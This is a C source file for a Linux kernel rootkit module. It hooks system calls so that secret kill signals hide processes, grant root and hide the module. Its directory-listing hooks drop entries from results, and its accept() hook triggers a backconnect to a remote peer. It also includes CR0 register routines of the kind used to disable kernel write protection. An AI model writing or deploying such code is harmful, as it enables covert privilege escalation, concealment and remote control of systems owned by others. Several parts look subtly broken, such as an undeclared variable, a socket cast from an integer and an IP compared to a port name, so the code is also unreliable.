#include "inc/hooks.h"
#include "inc/utils.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/net.h>

extern unsigned long *__sys_call_table;
extern t_syscall orig_getdents;
extern t_syscall orig_getdents64;
extern t_syscall orig_kill;
extern t_syscall orig_accept;

asmlinkage long hooked_kill(const struct pt_regs *pt_regs) {
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;
    struct task_struct *task = find_task(pid);

    if (is_invisible(pid)) {
        if (sig == SIGINVIS)
            task->flags ^= PF_INVISIBLE;
        else if (sig == SIGSUPER)
            give_root();
        else if (sig == SIGMODINVIS) {
            if (THIS_MODULE->state == MODULE_STATE_LIVE)
                module_hide();
            else
                module_show();
        }
        return 0;
    }
    return orig_kill(pt_regs);
}

asmlinkage long hooked_getdents(const struct pt_regs *pt_regs) {
    int fd;
    struct linux_dirent *dirent;
    int ret, err;
    struct linux_dirent *kdirent, *current;
    unsigned long off = 0;
    struct inode *d_inode;
    struct file *file;

    fd = (int) pt_regs->di;
    dirent = (struct linux_dirent *) pt_regs->si;
    ret = orig_getdents(pt_regs);

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err) {
        kfree(kdirent);
        return ret;
    }

    while (off < ret) {
        current = (void *) kdirent + off;
        if (strcmp(current->d_name, HIDDEN_PORT) == 0) {
            memmove(current, (void *) current + current->d_reclen, ret - (off + current->d_reclen));
            ret -= current->d_reclen;
            continue;
        }
        off += current->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}

asmlinkage long hooked_getdents64(const struct pt_regs *pt_regs) {
    struct linux_dirent64 *dirent;
    int ret;
    struct linux_dirent64 *kdirent, *current;
    unsigned long off = 0;

    dirent = (struct linux_dirent64 *) pt_regs->si;
    ret = orig_getdents64(pt_regs);

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err) {
        kfree(kdirent);
        return ret;
    }

    while (off < ret) {
        current = (void *) kdirent + off;
        if (strcmp(current->d_name, HIDDEN_PORT) == 0) {
            memmove(current, (void *) current + current->d_reclen, ret - (off + current->d_reclen));
            ret -= current->d_reclen;
            continue;
        }
        off += current->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}

unsigned long read_cr0(void) {
    unsigned long cr0;
    asm volatile ("mov %%cr0, %0" : "=r" (cr0));
    return cr0;
}

void write_cr0(unsigned long cr0) {
    asm volatile ("mov %0, %%cr0" : : "r" (cr0));
}

asmlinkage long hooked_accept(const struct pt_regs *pt_regs) {
    int ret;
    struct sockaddr_in addr;
    int len;
    char ip[16];

    ret = orig_accept(pt_regs);
    if (ret < 0)
        return ret;

    len = sizeof(addr);
    kernel_getpeername((struct socket *) ret, (struct sockaddr *) &addr, &len);

    snprintf(ip, sizeof(ip), "%pI4", &addr.sin_addr);
    if (strcmp(ip, HIDDEN_PORT) == 0)
        backconnect(ip, addr.sin_port);

    return ret;
}
